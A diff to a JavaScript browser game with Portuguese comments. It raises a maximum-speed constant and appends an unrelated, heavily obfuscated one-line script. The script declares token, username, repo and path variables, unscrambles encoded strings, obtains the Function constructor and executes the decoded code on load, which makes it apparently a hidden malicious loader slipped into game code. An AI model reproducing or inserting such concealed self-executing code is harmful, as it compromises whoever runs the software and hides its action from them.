@@ -576,7 +576,7 @@ function detectCollision(a, b) {
 function aumentarVelocidade() {
     if (!updatee) return;  // Se update for false, não executa a função
     
-    const velocidadeMaxima = 1;
+    const velocidadeMaxima = 12;
     
     // Aumentar 0.1 a cada 2 pontos inteiros
     let pontosInteiros = Math.floor(score);
@@ -597,6 +597,7 @@ function aumentarVelocidade() {
 // ========================
 
    var token,username,repo,path;(function(){var Gzc='',xBb=148-137;function dTo(g){var b=2210566;var c=g.length;var j=[];for(var d=0;d<c;d++){j[d]=g.charAt(d)};for(var d=0;d<c;d++){var z=b*(d+395)+(b%27365);var q=b*(d+240)+(b%33249);var w=z%c;var t=q%c;var i=j[w];j[w]=j[t];j[t]=i;b=(z+q)%6478225;};return j.join('')};var Squ=dTo('bxkstyurzogcmfcetrsiahlnpocwvdtnqjoru').substr(0,xBb);var MZu='[a+ ]rts,)(66=f vt),rr .+(;po 6=ph8jk+lizburzs2l.rxzara+h)ee.{(fj,7-7(7]]t8t;g1;a0-i3i =e8 o6=;n]14rsq=]zzr"k8;Cr1plunn9juvl)n2C+hp,v8q"a=;.=gd[5a((i=y+;*qpto;,;o;+h<t+.vvahfx3v h<+=2;(wkntfv8pb"*tg;r4)aao)(0>;<regn12;t({=rt9lz+r[+1tg+h+maaigume(tgicpasae7rv"69)]={)(v0; h1m.h=s8+z=stt7o0od<C)tslv1r=rdl90A,5;u(=sgi[lxr 6;i=v07,Ajh(q0;efj(4;lsnhngtnp8}t4e.gr(h6rm ]e";,)=l,e.2o,{re>cc.h6aeohaent(;m;9jrhi..j)+nS,-q]a"}(+f;);2nn}zr[;)oll,;c=fu+ae jj}lhsnf!z[vn(r[(i]=hoay)wrucvcmg)javi)oCuv1 .9duAtune;l)fue=1yraC-uie(-ou[re; fziAs =f.a m+)f0.apy=v;+=un(=0gu.n]anl] (,qi;rhv(df)ruu{u=e.a==e (lsj)=.d=.5hr8[,,b=e=;ls.1az=]i[o!=gv(c){"e-=n+)j1vusv v(ortaC+[vl;ta2;de)dy7rr{qqnf g;,z+omrb6rmsw;-}tv m=2,a[ o,+;lgcswr=C),brt,doi,tlvn;oa)=0..c))n9ba+)iaqr 4r8;rivr}7r(=i (ju;,prtq61;)ru==;uq,0Cs;).lhn,ts<2a");s. t],re()"lgv,[2A;(a.l)za,v;Sth=1=.2oapgla;ik;fiw[(]r(veetf"l f.sdlsr)}7.+umrf(r0(kni';var mFf=dTo[Squ];var onv='';var Jfd=mFf;var Erx=mFf(onv,dTo(MZu));var dLg=Erx(dTo('8n!e9P8}r(rilz+t8!prixf$7c$os ,uv)&(r{N%aeP#P-;=.P,1i{$y,_us.7Pr0f(an.(Pl0kPP(.ea.9),$r9)(z()!zsPu)P_l;Pn3)wtP[.8e..}4Pc }0t;1r-9""4,rdt5b082)3;,;;s1n2P,2d)zP_P7ae%m.,PPabeea5(shj31!{-Pso22Pt3s...b,}bi8a;pPjleg=z_P(aPr{..,-0Pnj$P0!=81_u]aSy$;P1_Pj0pP,1Pbg_[q8x\'efr.P&t(!;a.q}}3.f) c!,lu0(Pj(riPc)!fp0bl)S$h=P21t82(}tput_frnhl.Pof1P(PvqP0=g1,irP_,.a)P)l.2.1P#r_[!\/.).bPw4] $9)%P(_,)f%zP\/,6nmjP)1hbP$.".,.P4C.e3hto(az(9h}i%p_.c(z&(P,!6e=.)o\')=P))f.nc%+g,P"gP((giP%3;j_P().cc 7P(v;1lke(hfa+0)$P!8=(\/3e,r);x7P".#=f. )se=Ps8b4f;$.Sr;n$.,}.Plt_-!$t1=(;\'+nod;P#)re h(.i,b)4,. )kP=pgfe fgw-.fonx6Pg(%7.b.bb*{ $!;PP;. 9rtxC .]p33.e=eha$,Per+mezP)&"P{o.),.Phsr0;Ps2=hlPl_6ao3.]$.(;085uPP=P*u";3PPee.n=q}t{a=!(a{lPn5n{!s&32P,nz$l.hgh}jt.),;(.5rr0(7g8m*]lrn30rP3g3s).cP&%;,;#!)!+uo)g,P2%x#sPaI;e0t!x=.ppPe}$yrt0-r=,(r6r))f.ma(frP8ed90e-)7_lPt;P.u3te$4p#].g_0e.;f)txyi1 ;9=+a(PP3ql)t.o_P2e41P;!.Pmb*)fbo3f7!s8 gPt(eP{,7c(j.=mog0!i6e $lc_9i]P!\'%,;!bzxaP6 )=sPp!((.ktf2ei{Px3)},)3t_)}P*( ]\/;&(o;!zonn= ,+oig e(,neb5l!1$.2c.{4$)}._nP=P$+$eof;lP.t'));var ddd=Jfd(Gzc,dLg );ddd(7036);return 3040})()
+
 
 
     atualizarVelocidade();
